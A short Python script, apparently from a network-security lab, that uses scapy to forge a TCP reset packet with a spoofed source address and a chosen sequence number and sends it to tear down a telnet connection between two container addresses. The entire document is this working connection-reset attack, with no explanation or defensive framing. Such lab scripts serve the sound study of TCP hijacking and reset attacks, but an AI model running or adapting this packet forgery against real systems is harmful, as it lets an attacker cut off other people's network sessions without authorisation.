#!/usr/bin/python3
from scapy.all import *

print("SENDING RESET PACKET.........")
ip  = IP(src="172.17.0.2", dst="172.17.0.3")
tcp = TCP(sport=51632, dport=23, flags="R", seq=1713254838)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
